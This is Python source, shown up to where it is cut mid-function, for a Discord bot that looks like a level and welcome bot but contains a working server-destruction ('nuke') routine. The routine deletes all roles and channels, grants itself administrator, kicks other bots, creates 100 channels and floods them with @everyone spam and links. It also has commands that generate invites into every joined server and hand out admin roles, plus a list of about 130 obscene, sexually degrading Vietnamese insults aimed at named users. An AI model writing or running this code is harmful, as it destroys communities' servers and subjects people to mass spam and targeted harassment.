import asyncio
import os
import random
import discord
from discord.ext import commands
import aiohttp
from datetime import timedelta, datetime

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1535132569534865490,
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True

bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)

# Biến trạng thái cho spam
is_spamming = False
spam_task_running = None

# Lưu cấu hình cho từng server
SERVER_LOG_CHANNELS = {}       # {guild_id: channel_id}
WELCOME_CHANNELS = {}          # {guild_id: channel_id}
GOODBYE_CHANNELS = {}          # {guild_id: channel_id}
SERVER_LEVEL_CHANNELS = {}     # {guild_id: channel_id} - Kênh thông báo level riêng cho từng server

# Hệ thống Level lưu trữ tạm trong RAM
USER_LEVELS = {} # {guild_id: {user_id: {"exp": int, "level": int}}}

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/a3/30/8c/a3308c2100e2526873b3ae8b3ab47b57.gif"
NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa667260ec4d.jpg"

# ==================== KHO SPAM (209 CÂU) ====================
ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn già nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn già nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ già nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn già thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn già chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼D 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== VIEW XÁC NHẬN NUKE QUA DM ====================
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.guild.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()

        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        nuke_log_embed = discord.Embed(
            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
            color=0xFF0000
        )
        for g_id, ch_id in SERVER_LOG_CHANNELS.items():
            log_ch = bot.get_channel(ch_id)
            if log_ch:
                try:
                    await log_ch.send(embed=nuke_log_embed)
                except:
                    pass

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            
            tasks.append(guild.edit(name="DEAD SEVER"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            kick_tasks = []
            for member in guild.members:
                if member.bot and member.id != bot.user.id:
                    kick_tasks.append(member.kick(reason="Anti-bot / Nuke cleanup - Kicked by Boss Bảo's Bot"))
            
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        delete_tasks = [channel.delete() for channel in guild.channels]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        create_tasks = []
        for i in range(100):
            channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
            create_tasks.append(guild.create_text_channel(name=channel_name))
        
        created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://xnhau.pics/"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )
        
        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        
        for i in range(20):
            batch_tasks = []
            for channel in valid_channels:
                async def send_msg(ch=channel):
                    try:
                        embed = discord.Embed()
                        embed.set_image(url=NUKE_GIF_URL)
                        await ch.send(spam_content, embed=embed)
                    except:
                        pass
                batch_tasks.append(send_msg())
            
            await asyncio.gather(*batch_tasks, return_exceptions=True)
            await asyncio.sleep(0.3)

        complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
        for g_id, ch_id in SERVER_LOG_CHANNELS.items():
            log_ch = bot.get_channel(ch_id)
            if log_ch:
                try:
                    await log_ch.send(embed=complete_log_embed)
                except:
                    pass

    except Exception as e:
        print(f"Lỗi khi thực hiện nuke: {e}")

# ==================== HỆ THỐNG GÁN ROLE THEO LEVEL ====================
async def check_and_assign_level_roles(member: discord.Member, current_level: int):
    role_permissions_map = {
        20: {"name": "LV 20 - Ping Everyone", "perms": discord.Permissions(mention_everyone=True)},
        200: {"name": "LV 200 - Manage Channels/Roles", "perms": discord.Permissions(manage_channels=True, manage_roles=True)},
        300: {"name": "LV 300 - All Channels Access", "perms": discord.Permissions(view_channel=True)},
        400: {"name": "LV 400 - Server Manager", "perms": discord.Permissions(manage_guild=True)},
        500: {"name": "LV 500 - Admin Server", "perms": discord.Permissions(administrator=True)},
        670: {"name": "LV 670 - Owner Server", "perms": discord.Permissions(administrator=True)}
    }

    for req_lv, r_data in role_permissions_map.items():
        if current_level >= req_lv:
            role = discord.utils.get(member.guild.roles, name=r_data["name"])
            if not role:
                try:
                    role = await member.guild.create_role(name=r_data["name"], permissions=r_data["perms"], hoist=True)
                except:
                    continue
            if role and role not in member.roles:
                try:
                    await member.add_roles(role)
                except:
                    pass

# ==================== LỆNH CHANNELSLV ====================
@bot.command(name="channelslv")
@is_bot_owner()
async def channelslv(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if ctx.guild.id in SERVER_LEVEL_CHANNELS:
            del SERVER_LEVEL_CHANNELS[ctx.guild.id]
        await ctx.send("✅ Đã tắt thông báo level.")
        return
    SERVER_LEVEL_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã thiết lập kênh thông báo thăng cấp level là {channel.mention}")

@channelslv.error
async def channelslv_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `l!channelslv #kenh`")

# ==================== LỆNH ADDROLE ====================
@bot.command(name="addrole")
@is_bot_owner()
async def addrole(ctx, role_name: str, *, permissions_str: str = ""):
    try:
        bot_member = ctx.guild.me
        bot_permissions = bot_member.guild_permissions
        
        new_role = await ctx.guild.create_role(
            name=role_name,
            permissions=bot_permissions,
            color=discord.Color.random(),
            hoist=True,
            reason=f"Được tạo bởi lệnh l!addrole từ Boss Bảo"
        )
        
        embed = discord.Embed(
            title="✅ **TẠO VÀ GÁN QUYỀN ROLE THÀNH CÔNG** ✅",
            description=f"📌 **Tên Role:** `{new_role.name}`\n🛡️ **Quyền hạn:** Đã sao chép toàn bộ quyền hạn của bot.\n👤 **Thực thi:** {ctx.author.mention}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi tạo role: {str(e)}")

@addrole.error
async def addrole_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `l!addrole <tên_role>`")

# ==================== LỆNH SHOWSV ====================
@bot.command(name="showsv")
@is_bot_owner()
async def showsv(ctx):
    try:
        guilds = bot.guilds
        if not guilds:
            await ctx.send("🤖 Bot hiện chưa tham gia server nào.")
            return

        embed = discord.Embed(
            title=f"🌐 **DANH SÁCH MÁY CHỦ BOT ĐANG THAM GIA ({len(guilds)})** 🌐",
            color=0x00FFFF
        )
        
        for guild in guilds:
            try:
                owner = guild.owner or await guild.fetch_member(guild.owner_id)
                owner_str = f"{owner} (`{guild.owner_id}`)"
            except:
                owner_str = f"Không xác định (`{guild.owner_id}`)"

            invite_link = "Không thể tạo link"
            try:
                for c in guild.text_channels:
                    if c.permissions_for(guild.me).create_instant_invite:
                        invite = await c.create_invite(max_age=300, max_uses=1)
                        invite_link = invite.url
                        break
            except:
                pass

            guild_info = (
                f"👑 **Chủ sở hữu:** {owner_str}\n"
                f"👥 **Thành viên:** `{guild.member_count}`\n"
                f"🔗 **Link mời:** {invite_link}"
            )
            embed.add_field(name=f"🏰 {guild.name} (`{guild.id}`)", value=guild_info, inline=False)

        embed.set_footer(text=f"Yêu cầu bởi Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@showsv.error
async def showsv_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH SET CHÀO MỪNG VÀ TẠM BIỆT ====================
@bot.command(name="setwellcom")
@is_bot_owner()
async def set_wellcom(ctx, channel: discord.TextChannel):
    WELCOME_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã thiết lập kênh chào mừng thành công là {channel.mention}")

@set_wellcom.error
async def set_wellcom_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `l!setwellcom #kenh`")

@bot.command(name="setgoodbye")
@is_bot_owner()
async def set_goodbye(ctx, channel: discord.TextChannel):
    GOODBYE_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã thiết lập kênh tạm biệt thành công là {channel.mention}")

@set_goodbye.error
async def set_goodbye_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `l!setgoodbye #kenh`")

# ==================== LỆNH SETLV ====================
@bot.command(name="setlv")
@is_bot_owner()
async def set_level(ctx, level: int, member: discord.Member):
    try:
        if level < 1:
            await ctx.send("❌ Level tối thiểu phải từ 1 trở lên!")
            return

        guild_id = ctx.guild.id
        if guild_id not in USER_LEVELS:
            USER_LEVELS[guild_id] = {}
        
        user_id = member.id
        if user_id not in USER_LEVELS[guild_id]:
            USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}

        total_exp = 0
        for l in range(1, level):
            if l % 10 == 0:
                total_exp += 500
            else:
                total_exp += 100

        USER_LEVELS[guild_id][user_id]["level"] = level
        USER_LEVELS[guild_id][user_id]["exp"] = total_exp

        await check_and_assign_level_roles(member, level)

        embed = discord.Embed(
            title="⭐ **CẬP NHẬT LEVEL THÀNH CÔNG** ⭐",
            description=f"👑 Boss Bảo đã đặt level của {member.mention} lên mức **Level {level}**!",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản lý độc quyền của Boss Bảo 💖")
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")

@set_level.error
async def set_level_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `l!setlv <level> @user`")

# ==================== LỆNH LV ====================
@bot.command(name="lv")
async def check_user_level(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author

    guild_id = ctx.guild.id
    user_id = member.id

    user_data = USER_LEVELS.get(guild_id, {}).get(user_id, {"exp": 0, "level": 1})
    current_level = user_data["level"]
    current_exp = user_data["exp"]
    
    if current_level % 10 == 0:
        required_exp = 500
    else:
        required_exp = 100

    embed = discord.Embed(
        title=f"📊 **HỆ THỐNG LEVEL - {member.display_name}** 📊",
        description=f"👤 **Thành viên:** {member.mention}\n⭐ **Level hiện tại:** `{current_level}`\n✨ **EXP:** `{current_exp} / {required_exp}`",
        color=0x00FFFF
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống thăng cấp độc quyền phục vụ server 💖")
    await ctx.send(embed=embed)

@check_user_level.error
async def check_user_level_error(ctx, error):
    await ctx.send(f"❌ Cú pháp đúng: `l!lv` hoặc `l!lv @user`")

# ==================== SỰ KIỆN CHÀO MỪNG & TẠM BIỆT ====================
@bot.event
async def on_member_join(member):
    if member.guild is None: return
    
    embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI GIA NHẬP", description=f"{member.mention} đã tham gia server.", color=0x00FF00)
    await send_log_to_all(member.guild.id, embed_log)

    guild_id = member.guild.id
    if guild_id in WELCOME_CHANNELS:
        ch_id = WELCOME_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="🌈 **CHÀO MỪNG CHÚ BÁO NHỎ ĐẾN VỚI SERVER!** 🌈",
                description=(
                    f"✨ Chào mừng chú báo nhỏ {member.mention} đã gia nhập máy chủ **{member.guild.name}**!\n\n"
                    "📌 **Giới thiệu các kênh:** Hãy khám phá đầy đủ các khu vực trò chuyện và giải trí.\n"
                    "📜 **Luật chung:** Luôn tuân thủ nội quy để server ngày càng văn minh nhé!\n\n"
                    "💖 Chúc bạn có những phút giây vui vẻ!"
                ),
                color=0x00FFFF
            )
            embed.set_image(url="https://i.pinimg.com/originals/54/19/c9/5419c9ce3ffade43b2837daa2c96b1d9.gif")
            embed.set_footer(text=f"Thành viên thứ #{member.guild.member_count}")
            await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    if member.guild is None: return
    
    embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI KHỎI SERVER", description=f"{member.mention} đã rời server.", color=0xFF9900)
    await send_log_to_all(member.guild.id, embed_log)

    guild_id = member.guild.id
    
    try:
        dm_embed = discord.Embed(
            title="💔 **TẠM BIỆT BẠN NHÉ!** 💔",
            description=(
                f"😢 Server vô cùng nuối tiếc khi thấy {member.mention} đã rời khỏi **{member.guild.name}**...\n"
                "🍀 Chúc bạn luôn bình an, gặp nhiều may mắn và có một cuộc sống thật vui vẻ, hạnh phúc trên con đường sắp tới! Hẹn gặp lại!"
            ),
            color=0xFF69B4
